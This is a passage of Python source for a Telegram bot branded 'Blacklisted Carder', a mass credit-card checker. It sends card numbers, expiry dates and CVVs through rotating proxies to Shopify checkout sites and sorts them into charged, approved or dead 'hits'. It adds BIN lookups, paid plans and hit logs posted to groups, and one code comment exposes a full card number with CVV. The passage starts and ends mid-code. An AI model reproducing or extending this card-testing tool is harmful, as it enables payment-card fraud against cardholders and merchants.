    return elapsed < BUTTON_LOCK_SECONDS

def get_remaining_lock(session_id: str) -> int:
    session = MSH_SESSIONS.get(session_id)
    if not session: return 0
    elapsed = time.time() - session.get('start_time', 0)
    remaining = BUTTON_LOCK_SECONDS - elapsed
    return max(0, int(remaining) + 1)

async def get_user_plan_name(user_id):
    # Admins always appear as Root regardless of DB state
    if user_id in ADMIN_IDS:
        return "Root"
    is_premium, _ = get_premium_status(user_id)
    if is_premium:
        try:
            def _sync_fetch():
                col = get_collection("receipts")
                r = col.find_one({"user_id": user_id}, sort=[("purchased_on", -1)])
                return r["plan"].upper() if r else "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    else:
        return "TRIAL"

async def get_user_proxies(user_id):
    proxies = []
    try:
        def _sync_fetch():
            col = get_collection("proxies")
            docs = list(col.find({"user_id": user_id}, {"proxy": 1, "_id": 0}))
            return [d["proxy"] for d in docs if "proxy" in d]
        proxies = await asyncio.to_thread(_sync_fetch)
    except Exception as e:
        logging.error(f"Error fetching proxies for user {user_id}: {e}")
    if not proxies:
        proxies = load_global_proxies()
    return proxies

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    reverse_digits = card_number[::-1]
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        current_date = datetime.now()
        current_year = current_date.year % 100
        current_month = current_date.month
        exp_year = int(yy)
        exp_month = int(mm)
        if exp_year < current_year:
            return True
        elif exp_year == current_year:
            if exp_month < current_month:
                return True
        return False
    except ValueError:
        return True

def get_sites():
    sites = []
    try:
        if os.path.exists(SITES_FILE):
            with open(SITES_FILE, "r", encoding="utf-8", errors="ignore") as f:
                sites = [line.strip() for line in f if line.strip()]
    except Exception as e:
        logging.error(f"Error reading sites.txt: {e}")
    return sites

def get_user_display(user_obj, plan_name):
    return f"{user_obj.first_name} ({plan_name})"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API PROCESSING FUNCTION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str) -> Tuple[bool, str, str, str, str, str, str, int]:
    """
    Process card using the API endpoint.

    Returns:
        Tuple of (success, message, url, gateway, price, currency, proxy_status, http_status)
    """
    import aiohttp

    cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
    api_url = f"{API_BASE_URL}?card={cc_formatted}&url={site}&proxy={proxy}"

    logging.debug(f"[API] Processing {cc[:6]}**** via {mask_proxy(proxy)}")

    http_status = None
    _api_t0 = time.monotonic()

    try:
        data = await call_shopify_api(
            card=cc_formatted,
            site=site,
            proxy=proxy,
            timeout=30,
        )
        http_status = 200

        gateway = data.get("gateway", "Shopify Payments")
        price = str(data.get("amount", "0.00") or "0.00")
        api_response = (
            data.get("error")
            or data.get("declined_reason")
            or data.get("response_text")
            or data.get("status")
            or "Unknown Error"
        )
        success = bool(data.get("success", False))

        proxy_status = "Live" if success else "Dead"

        _record_api_outcome(
            success=True,
            elapsed_ms=(time.monotonic() - _api_t0) * 1000,
        )

        return (
            success,
            api_response,
            site,
            gateway,
            price,
            data.get("currency", "USD"),
            proxy_status,
            http_status
        )

    except asyncio.CancelledError:
        raise
    except aiohttp.ClientError as e:
        _record_api_outcome(
            success=False,
            elapsed_ms=(time.monotonic() - _api_t0) * 1000,
        )
        return (
            False,
            f"Connection Error: {str(e)}",
            site,
            "Shopify Payments",
            "0.00",
            "USD",
            "Error",
            None
        )
    except Exception as e:
        _record_api_outcome(
            success=False,
            elapsed_ms=(time.monotonic() - _api_t0) * 1000,
        )
        return (
            False,
            f"Error: {str(e)}",
            site,
            "Shopify Payments",
            "0.00",
            "USD",
            "Error",
            None
        )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESULT FILE GENERATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    cards_list = []

    if result_type == "charged":
        cards_list = session.get('charged_cards', [])
        type_label = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱"
        type_emoji = "💎"
    elif result_type == "live":
        cards_list = session.get('live_cards', [])
        type_label = "𝗟𝗶𝘃𝗲"
        type_emoji = "✅"
    elif result_type == "dead":
        cards_list = session.get('dead_cards', [])
        type_label = "𝗗𝗲𝗮𝗱"
        type_emoji = "❌"
    else:
        cards_list = (
            session.get('charged_cards', []) +
            session.get('live_cards', []) +
            session.get('dead_cards', []) +
            session.get('error_cards', [])
        )
        type_label = "𝗔𝗹𝗹"
        type_emoji = "📁"

    total_count = len(cards_list)
    user_display = get_user_display(user_obj, plan_name)

    lines = []
    lines.append("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    lines.append("┃      𝗕𝗹𝗮𝗰𝗸𝗹𝗶𝘀𝘁𝗲𝗱 𝗖𝗮𝗿𝗱𝗲𝗿       ┃")
    lines.append("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    lines.append("")
    lines.append(f"𝗥𝗲𝘀𝘂𝗹𝘁 𝗧𝘆𝗽𝗲 ➛ {type_label} {type_emoji}")
    lines.append(f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ {total_count}")
    lines.append(f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗜𝗙𝘆 𝗠𝗮𝘀𝘀")
    lines.append(f"𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆 ➛ Blacklisted Carder")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("")

    if total_count == 0:
        lines.append("⚠️ No cards found for this category")
    else:
        for card_data in cards_list:
            cc = card_data.get('card', 'N/A')
            response = card_data.get('response', 'N/A')
            bin_info = card_data.get('bin_info', {})
            price = card_data.get('price', 'N/A')

            scheme = bin_info.get('scheme', 'N/A')
            bank = bin_info.get('bank', 'N/A')
            country = bin_info.get('country', 'N/A')
            flag = bin_info.get('country_emoji', '')
            country_display = f"{flag} {country}" if flag else country

            if "CHARGED" in response or "ORDER_PAID" in response:
                status = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 💎"
            elif "APPROVED" in response or "INVALID_CVC" in response or "INSUFFICIENT" in response:
                status = "𝗔𝗣𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
            elif any(err in response for err in ["timeout", "connection error", "max retries", "json decode", "invalid api", "Unknown Error"]):
                status = "𝗘𝗥𝗥𝗢𝗥 ⚠️"
            else:
                status = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌"

            lines.append(f"𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {status}")
            lines.append(f"𝗖𝗮𝗿𝗱 ➛ {cc}")
            lines.append(f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 {price} 𝗨𝗦𝗗")
            lines.append(f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ {response}")
            lines.append(f"𝗕𝗿𝗮𝗻𝗱 ➛ {scheme}")
            lines.append(f"𝗜𝘀𝘀𝘂𝗲𝗿 ➛ {bank}")
            lines.append(f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ {country_display}")
            lines.append(f"𝗨𝘀𝗲𝗿 ➛ {user_display}")
            lines.append("Blacklisted Carder ( 8952038376 )")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            lines.append("")

    content = "\n".join(lines)
    file_buffer = BytesIO(content.encode('utf-8'))
    file_buffer.seek(0)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    type_map = {"charged": "CHARGED", "live": "LIVE", "dead": "DEAD", "all": "ALL"}
    filename = f"BLC_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"

    return file_buffer, filename, total_count

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MESSAGE SENDING HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_hit_log_to_group(bot: Bot, response_msg, user_obj, plan_name, proxy_status_formatted, price):
    user_link = build_user_link(user_obj)
    gateway_display = html_escape(f"Shopify {price} USD")
    safe_response = html_escape(str(response_msg))
    safe_plan = html_escape(str(plan_name))

    caption = (
        f"<tg-emoji emoji-id=\"{CUSTOM_CHARGED_EMOJI_ID}\">💎</tg-emoji> "
        f"<b>𝗛𝗜𝗧 ➛ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗</b>\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> {gateway_display}\n"
        f"<b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛</b> {safe_response}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<b>𝗨𝘀𝗲𝗿 ➛</b> {user_link} <i>({safe_plan})</i>"
    )

    reply_markup = None

    try:
        await bot.send_message(
            chat_id=HIT_LOG_GROUP_ID,
            text=caption,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    except Exception as e:
        logging.error(f"Error sending hit log: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SHARED HIT-CARD UI BUILDER — used by APPROVED + CHARGED messages
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _build_hit_caption(
    cc_formatted: str,
    response_msg: str,
    bin_data: dict,
    api_price,
    user_obj,
    plan_name: str,
    is_charged: bool,
) -> str:
    """
    Builds a premium-looking hit card caption.
    is_charged=True  → 💎 CHARGED card (DM-pinned + extra charged group)
    is_charged=False → ✅ APPROVED card (DM only)
    """
    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name
    gateway_display = html_escape(f"Shopify {api_price} USD")
    safe_response = html_escape(str(response_msg))
    safe_card = html_escape(cc_formatted)
    safe_plan = html_escape(str(plan_name))
    user_link = build_user_link(user_obj)

    if is_charged:
        status_emoji = f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji>'
        status_text = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗"
        plan_icon = f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji>'
    else:
        status_emoji = f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'
        status_text = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱"
        plan_icon = f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji>'

    # Plan badge — show only premium (non-TRIAL) plans
    plan_badge = ""
    plan_lower = str(plan_name).strip().lower()
    if plan_lower and plan_lower not in ("trial", "free", "none", ""):
        plan_badge = f" {plan_icon} <i>{safe_plan}</i>"

    return (
        # ━━━ Header banner ━━━
        f"<tg-emoji emoji-id=\"{EMOJI_CROWN}\">👑</tg-emoji> "
        f"<b><a href=\"https://t.me/blacklistedcarder1\">Blacklisted Carder</a></b> "
        f"┇ <tg-emoji emoji-id=\"{EMOJI_EPIC}\">✨</tg-emoji> <i>Premium Checker</i>\n"
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ Status line ━━━
        f"{status_emoji} <b>{status_text}</b>\n"
        # ━━━ Card in box ━━━
        f"┌─────────────────────────\n"
        f"│  <code>{safe_card}</code>\n"
        f"└─────────────────────────\n"
        # ━━━ Gateway / Response ━━━
        f"<tg-emoji emoji-id=\"{EMOJI_FIRE}\">🔥</tg-emoji> <b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> {gateway_display}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_LIGHTNING}\">⚡</tg-emoji> <b>𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛</b> <code>{safe_response}</code>\n"
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ BIN info section ━━━
        f"<tg-emoji emoji-id=\"{EMOJI_WHITE_STAR}\">🌟</tg-emoji> <b>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼</b>\n"
        f"🏷 <b>𝗕𝗿𝗮𝗻𝗱 ➛</b> {bin_scheme}\n"
        f"🏛 <b>𝗜𝘀𝘀𝘂𝗲𝗿 ➛</b> {bin_bank}\n"
        f"🚩 <b>𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛</b> {bin_country}\n"
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ Footer ━━━
        f"👤 <b>𝗨𝘀𝗲𝗿 ➛</b> {user_link}{plan_badge}\n"
        f"<tg-emoji emoji-id=\"{EMOJI_CROWN}\">👑</tg-emoji> <b>𝗗𝗲𝘃 ➛</b> "
        f"<b><a href=\"https://t.me/blacklistedcarder1\">@blacklistedcarder1</a></b>"
    )


async def send_approved_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name):
    """Always sends the approved hit to the user's DM (private chat)."""
    gif_url = await get_anime_gif()
    caption = _build_hit_caption(
        cc_formatted, response_msg, bin_data, api_price,
        user_obj, plan_name, is_charged=False,
    )

    # Always send to user's DM (throttled to avoid Telegram flood control)
    await _safe_send_animation_dm(
        bot,
        user_obj.id,
        animation=gif_url,
        caption=caption,
        parse_mode="HTML",
    )

async def send_charged_msg_to_user(bot: Bot, cc_formatted, response_msg, bin_data, proxy_status_formatted, api_price, user_obj, plan_name):
    """Always sends the charged hit to the user's DM (private chat) + extra charged group."""
    gif_url = await get_anime_gif()
    caption = _build_hit_caption(
        cc_formatted, response_msg, bin_data, api_price,
        user_obj, plan_name, is_charged=True,
    )

    # Always send to user's DM (throttled to avoid Telegram flood control)
    dm_msg = await _safe_send_animation_dm(
        bot,
        user_obj.id,
        animation=gif_url,
        caption=caption,
        parse_mode="HTML",
    )
    if dm_msg is not None:
        try:
            await bot.pin_chat_message(
                chat_id=user_obj.id,
                message_id=dm_msg.message_id,
                disable_notification=True,
            )
        except Exception as pe:
            logging.warning(f"[MSH] Could not pin charged hit for user {user_obj.id}: {pe}")

    # Also send to extra charged group log
    try:
        await bot.send_animation(
            chat_id=EXTRA_CHARGED_GROUP_ID,
            animation=gif_url,
            caption=caption,
            parse_mode="HTML"
        )
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.error(f"Could not send charged hit to extra group {EXTRA_CHARGED_GROUP_ID}: {e}")
    except Exception as e:
        logging.error(f"Error sending HIT to extra group: {e}")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BUTTONS & PROGRESS MESSAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def get_result_buttons(session_id: str, is_running: bool = True) -> dict:
    session = MSH_SESSIONS.get(session_id, {})

    approved_count = session.get('approved', 0)
    dead_count = session.get('dead', 0)
    charged_count = session.get('charged', 0)
    checked_count = session.get('checked', 0)
    error_count = session.get('errors', 0)

    buttons = []

    buttons.append([
        {
            "text": f"Lɪᴠᴇ ({approved_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="live").pack(),
            "style": "success",
            "icon_custom_emoji_id": BTN_LIVE_EMOJI_ID
        },
        {
            "text": f"Dᴇᴀᴅ ({dead_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="dead").pack(),
            "style": "danger",
            "icon_custom_emoji_id": BTN_DEAD_EMOJI_ID
        }
    ])

    buttons.append([
        {
            "text": f"Cʜᴀʀɢᴇᴅ ({charged_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="charged").pack(),
            "style": "primary",
            "icon_custom_emoji_id": BTN_CHARGED_EMOJI_ID
        },
        {
            "text": f"Aʟʟ ({checked_count})",
            "callback_data": MshResultCallback(session_id=session_id, result_type="all").pack(),
            "style": "primary",
            "icon_custom_emoji_id": BTN_ALL_EMOJI_ID
        }
    ])

    if not is_running and error_count > 0:
        buttons.append([
            {
                "text": f"🔁 Rᴇᴛʀʏ Eʀʀᴏʀs ({error_count})",
                "callback_data": MshRetryCallback(session_id=session_id).pack(),
                "style": "primary"
            }
        ])

    if is_running:
        buttons.append([
            {
                "text": "Sᴛᴏᴘ Cʜᴇᴄᴋɪɴɢ",
                "callback_data": MshStopCallback(session_id=session_id).pack(),
                "style": "danger",
                "icon_custom_emoji_id": BTN_STOP_EMOJI_ID
            }
        ])

    return {"inline_keyboard": buttons}

async def update_progress_message(bot: Bot, session_id):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    current_time = time.time()
    last_update = session.get('last_update_time', 0)
    cooldown_until = session.get('telegram_cooldown_until', 0)
    is_finished = session['status'] == "FINISHED"
    is_stopped = session['status'] == "STOPPED"

    # Respect Telegram's RetryAfter cooldown (set when flood control hits)
    if current_time < cooldown_until and not is_finished and not is_stopped:
        return

    # Per-session throttle: 2.0s between edits (Telegram limit ~1/sec per chat),
    # with ±350ms jitter. The jitter prevents 15 concurrent sessions from all
    # editing at the exact same instant and triggering synchronized flood
    # control retries.
    if not is_finished and not is_stopped:
        elapsed = current_time - last_update
        if elapsed < 2.0:
            return
        # If we're close to the boundary, push the next attempt a bit further
        # so concurrent sessions don't synchronise. (Self-correcting: the
        # next valid edit will reset last_update_time and re-sync.)
        if elapsed < 2.0 + random.uniform(0, 0.35):
            return

    text = _build_progress_caption(session, session_id)

    if session.get('last_text') == text:
        return

    if session_id not in SESSION_LOCKS:
        SESSION_LOCKS[session_id] = asyncio.Lock()

    async with SESSION_LOCKS[session_id]:
        if session.get('last_text') == text:
            return

        is_running = session['status'] == "CHECKING"
        reply_markup = get_result_buttons(session_id, is_running=is_running)

        try:
            await bot.edit_message_text(
                chat_id=session['chat_id'],
                message_id=session['msg_id'],
                text=text,
                parse_mode="HTML",
                reply_markup=reply_markup
            )
            session['last_text'] = text
            session['last_update_time'] = current_time
        except TelegramRetryAfter as e:
            # Telegram told us to wait N seconds — record cooldown so we
            # don't keep hammering the same chat with edits. This is expected
            # when multiple sessions edit the same chat concurrently.
            retry_seconds = getattr(e, 'retry_after', 5) or 5
            session['telegram_cooldown_until'] = current_time + retry_seconds
            logging.info(
                f"[MSH] Telegram flood control on progress edit — "
                f"cooling down for {retry_seconds}s (session {session_id}, "
                f"this is normal under multi-session load)"
            )
        except TelegramBadRequest as e:
            error_msg = str(e).lower()
            if "message is not modified" not in error_msg and "message to edit not found" not in error_msg:
                logging.error(f"Error updating progress: {e}")
        except Exception as e:
            logging.error(f"Error updating progress: {e}")


def _build_progress_caption(session: dict, session_id: str) -> str:
    """
    Builds the premium-looking progress message used by both the initial
    message and every live update during the mass check.
    """
    elapsed = time.time() - session['start_time']
    minutes = int(elapsed // 60)
    seconds = int(elapsed % 60)
    elapsed_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"

    status = session['status']
    if status == "CHECKING":
        status_emoji = "🔄"
        status_text = f"<i>CHECKING</i>"
    elif status == "STOPPED":
        status_emoji = "🛑"
        status_text = f"<b>STOPPED</b>"
    else:  # FINISHED
        status_emoji = "✅"
        status_text = f"<b>FINISHED</b>"

    checked = session['checked']
    total = session['total']
    approved = session['approved']
    charged = session['charged']
    dead = session['dead']
    errors = session['errors']

    # ━━━ Visual progress bar (14 chars wide) ━━━
    bar_width = 14
    if total > 0:
        filled = max(0, min(bar_width, int(round(bar_width * checked / total))))
    else:
        filled = 0
    empty = bar_width - filled
    progress_bar = "█" * filled + "░" * empty
    pct = int(round(100 * checked / total)) if total > 0 else 0

    proxy_line = ""
    proxy_manager = session.get('proxy_manager')
    if proxy_manager:
        stats = proxy_manager.get_stats()
        proxy_line = (
            f"\n  <tg-emoji emoji-id=\"{EMOJI_LIGHTNING}\">⚡</tg-emoji> "
            f"<b>𝗣𝗿𝗼𝘅𝗶𝗲𝘀 ➛</b> "
            f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">🟢</tg-emoji>'
            f'<code>{stats["active"]}</code>'
            f" / "
            f'<code>{stats["total_proxies"]}</code> active'
        )

    return (
        # ━━━ Header banner ━━━
        f'<tg-emoji emoji-id="{EMOJI_CROWN}">👑</tg-emoji> '
        f'<b><a href="https://t.me/blacklistedcarder1">Blacklisted Carder</a></b> '
        f'┇ <tg-emoji emoji-id="{EMOJI_EPIC}">✨</tg-emoji> <i>Premium Checker</i>\n'
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ Gateway + Status ━━━
        f'<tg-emoji emoji-id="{EMOJI_FIRE}">🔥</tg-emoji> <b>𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛</b> Shopify\n'
        f'<tg-emoji emoji-id="{EMOJI_BLUE_TICK}">🎯</tg-emoji> <b>𝗦𝘁𝗮𝘁𝘂𝘀 ➛</b> {status_text} {status_emoji}\n'
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ Progress bar ━━━
        f'<tg-emoji emoji-id="{EMOJI_WHITE_STAR}">📊</tg-emoji> <b>𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦</b>\n'
        f"<code>[{progress_bar}]</code> <b>{pct}%</b>\n"
        f"<b>𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➛</b> <code>{checked}/{total}</code>\n"
        # ━━━ Counts ━━━
        f'<tg-emoji emoji-id="{CUSTOM_APPROVED_EMOJI_ID}">✅</tg-emoji> '
        f'<b>𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ➛</b> <b>{approved}</b>\n'
        f'<tg-emoji emoji-id="{CUSTOM_CHARGED_EMOJI_ID}">💎</tg-emoji> '
        f'<b>𝗖𝗛𝗔𝗥𝗚𝗘𝗗 ➛</b> <b>{charged}</b>\n'
        f'<tg-emoji emoji-id="{CUSTOM_DECLINED_EMOJI_ID}">❌</tg-emoji> '
        f'<b>𝗗𝗲𝗮𝗱 ➛</b> <b>{dead}</b>\n'
        f'<tg-emoji emoji-id="{EMOJI_RED_TICK}">⚠️</tg-emoji> '
        f'<b>𝗘𝗿𝗿𝗼𝗿𝘀 ➛</b> <b>{errors}</b>\n'
        f'<tg-emoji emoji-id="{EMOJI_LIGHTNING}">⏱</tg-emoji> '
        f'<b>𝗧𝗶𝗺𝗲 ➛</b> <b>{elapsed_str}</b>'
        f"{proxy_line}\n"
        f"━━━━━━━━━━━━━━━━\n"
        # ━━━ Footer ━━━
        f"🔑 <b>𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗜𝗗 ➛</b> <code>{session_id}</code>\n"
        f'<tg-emoji emoji-id="{EMOJI_CROWN}">👑</tg-emoji> <b>𝗗𝗲𝘃 ➛</b> '
        f'<b><a href="https://t.me/blacklistedcarder1">@blacklistedcarder1</a></b>'
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SINGLE CARD PROCESSING - WITH SMART RETRY LOGIC
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_single_card(session_id, cc_formatted, cc_num, user_id, bot, user_obj, plan_name):
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return

    if is_session_stopped(session_id):
        return

    # Whether the check was started from a group chat
    is_group = session.get('is_group', False)

    sites_list = get_sites()
    if not sites_list:
        logging.error(f"[MSH] sites.txt is empty — no sites available for session {session_id}")
        session['errors'] += 1
        return

    proxy_manager = session.get('proxy_manager')
    if not proxy_manager:
        logging.error(f"[MSH] No proxy manager found for session {session_id}")
        session['errors'] += 1
        return

    # ══════════════════════════════════════════
    # STATUS CLASSIFICATION RULES
    # ══════════════════════════════════════════

    DECLINED_RESPONSES = [
        'CARD_DECLINED', 'CARD DECLINED',
        'PROCESSING_ERROR', 'PROCESSING ERROR',
        'GENERIC_ERROR', 'GENERIC ERROR',
        'GENERIC_DECLINE', 'GENERIC DECLINE',
        'DO NOT HONOR', 'DO_NOT_HONOR',
        'UNKNOWN_ERROR', 'UNKNOWN ERROR', 'Processing Error',
        'PICK_UP_CARD', 'PICK UP CARD', 'DECISION_RULE_BLOCK', 'DECISION RULE BLOCK',
        'FRAUD_SUSPECTED', 'FRAUD SUSPECTED', '3DS_REQUIRED', '3DS REQUIRED',
        'INVALID_PURCHASE_TYPE', 'INVALID PURCHASE TYPE',
        'INVALID_PAYMENT_METHOD', 'INVALID PAYMENT METHOD',
        'TEST_MODE_LIVE_CARD', 'TEST MODE LIVE CARD',
        'AMOUNT_TOO_SMALL', 'AMOUNT TOO SMALL',
        'INCORRECT_NUMBER', 'INCORRECT NUMBER',
        'EXPIRED_CARD', 'EXPIRED CARD',
        # New API-specific declined patterns
        'CREDIT CARD BRAND', 'CREDIT_CARD_BRAND',
        'BRAND IS NOT SUPPORTED', 'BRAND_NOT_SUPPORTED',
        'CARD NOT SUPPORTED', 'CARD_NOT_SUPPORTED',
        'CARD BRAND',
    ]       

    result_status = "ERROR"
    response_msg = "Unknown Error"
    api_price = "0.00"
    proxy_status_formatted = "Unknown 🔴"
    bin_data = {}
    used_proxy = None

    MAX_RETRIES = 3
    attempt = 0
    used_sites: set = set()

    parts = cc_formatted.split('|')
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 2: yy = "20" + yy

    if is_session_stopped(session_id):
        return

    try:
        bin_data = await get_bin_info(cc_num[:6])
    except:
        bin_data = {}

    if is_session_stopped(session_id):
        return

    while attempt < MAX_RETRIES:
        if is_session_stopped(session_id):
            return

        attempt += 1

        proxy_result = proxy_manager.get_next_proxy()

        if not proxy_result:
            logging.error(f"[MSH] No proxies available for session {session_id}")
            session['errors'] += 1
            return

        proxy, is_rotated = proxy_result
        used_proxy = proxy

        if is_session_stopped(session_id):
            return

        available_sites = [s for s in sites_list if s not in used_sites]
        if not available_sites:
            available_sites = sites_list     # fallback if all sites exhausted
        site = random.choice(available_sites)
        used_sites.add(site)

        if is_session_stopped(session_id):
            return

        try:
            success, message, url, gateway, price, currency, proxy_status_raw, http_status = await process_card_api(
                cc=cc, mes=mm, ano=yy, cvv=cvv, site=site, proxy=proxy
            )

            if is_session_stopped(session_id):
                return

            if "live" in str(proxy_status_raw).lower():
                proxy_status_formatted = "Live 🟢"
            else:
                proxy_status_formatted = "Dead 🔴"

            api_price = price

            proxy_manager.report_result(proxy, message, http_status)

            message_upper = message.upper()
            message_lower = message.lower()
            # Normalise underscores → spaces so new API ("Card Declined")
            # matches against keywords that use underscores ("CARD_DECLINED")
            message_normalized = message_upper.replace("_", " ")

            # ══════════════════════════════════════════════════════
            # STATUS CLASSIFICATION — Shopify1-style pattern
            # ══════════════════════════════════════════════════════

            # ── 1. CHARGED ───────────────────────────────────────
            # "Charged USD X.XX" (new API) / "ORDER_PAID" / "THANK YOU" / etc.
            if (
                "CHARGED" in message_upper
                or "ORDER_PAID" in message_upper
                or "ORDER PLACED" in message_normalized
                or "THANK YOU" in message_upper
            ):
                result_status = "CHARGED"
                response_msg = message
                break

            # ── 2. APPROVED ──────────────────────────────────────
            # "Approved USD X.XX" (new API) / "INSUFFICIENT_FUNDS" /
            # "INCORRECT_CVC" / "INVALID_CVC" (old API) / "3DS" variants
            elif (
                "APPROVED" in message_upper
                or "INSUFFICIENT" in message_lower
                or "INCORRECT_CVC" in message_normalized
                or "INVALID_CVC" in message_normalized
                or "3D_AUTHENTICATION" in message_normalized
                or "3DS_REQUIRED" in message_normalized
                or "3DS" in message_upper
            ):
                result_status = "APPROVED"
                response_msg = message
                break

            # ── 3. EXPLICIT DECLINED keywords ────────────────────
            # Catches things like "CARD_DECLINED", "BRAND IS NOT SUPPORTED", etc.
            elif any(d.upper() in message_normalized for d in DECLINED_RESPONSES):
                result_status = "DEAD"
                response_msg = message
                break

            # ── 4. RETRYABLE SITE / CHECKOUT ERROR ────────────────
            # These messages contain "error" but they're actually
            # site/checkout failures — NOT a proxy problem. We must
            # retry on a DIFFERENT site before giving up. Catches
            # things like:
            #   "An error occurred during the checkout process"
            #   "Error processing payment"
            #   "Internal checkout error"
            #   "Store checkout failed"
            #
            # IMPORTANT: this branch runs BEFORE the generic
            # `"ERROR" in message_upper` branch below — otherwise the
            # generic check would short-circuit these into ERROR
            # status with zero retries, which is what happened to
            # the card 4240090003774430|06|29|553.
            elif any(retry_err.lower() in message_lower for retry_err in RETRY_ERRORS):
                if attempt < MAX_RETRIES:
                    logging.info(
                        f"[MSH] Site/Checkout error ({message[:60]}...) - "
                        f"retrying with different site... ({attempt}/{MAX_RETRIES})"
                    )
                    await asyncio.sleep(0.10 + random.uniform(0, 0.10))
                    continue
                else:
                    result_status = "ERROR"
                    response_msg = f"Site Error (retried {MAX_RETRIES}x): {message}"
                    break

            # ── 5. GENERIC ERROR / proxy / timeout / site errors ─
            # API returned an error-like response — not a real card result
            elif (
